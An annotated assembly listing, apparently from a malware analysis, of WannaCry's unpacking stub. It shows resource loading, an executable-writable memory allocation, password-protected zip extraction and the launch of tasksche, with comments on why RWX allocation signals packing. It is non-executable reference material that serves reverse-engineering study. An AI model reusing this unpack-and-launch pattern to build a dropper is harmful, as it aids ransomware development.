; WannaCry Runtime Unpacking Stub
; Tool: Ghidra 11.x and x64dbg - File: wcry.exe
; Documentation only - cannot be assembled or executed
; Unresolved symbolic references throughout

PUSH    offset resource_name
PUSH    RT_RCDATA
PUSH    [hModule]
CALL    FindResourceW
MOV     [hResource], EAX

PUSH    [hResource]
PUSH    [hModule]
CALL    LoadResource
MOV     [hResData], EAX

PUSH    [hResData]
CALL    LockResource
MOV     [pResData], EAX

PUSH    [hResource]
PUSH    [hModule]
CALL    SizeofResource
MOV     [dwResSize], EAX

PUSH    PAGE_EXECUTE_READWRITE
PUSH    MEM_COMMIT
PUSH    [dwResSize]
PUSH    0
CALL    VirtualAlloc
MOV     [pUnpackBuf], EAX

PUSH    [dwResSize]
PUSH    [pResData]
PUSH    [pUnpackBuf]
CALL    RtlCopyMemory

PUSH    offset zip_password
PUSH    [dwResSize]
PUSH    [pUnpackBuf]
CALL    sub_extract_zip

PUSH    offset tasksche_path
CALL    CreateProcessA

; Pattern: VirtualAlloc with PAGE_EXECUTE_READWRITE is a packing indicator
; Legitimate code is R-X only - legitimate data is RW- only
; RWX means code was written into memory at runtime then executed
; This confirms the high entropy .rsrc section from Phase 2
; Extracted components include the payload the Tor client and key files
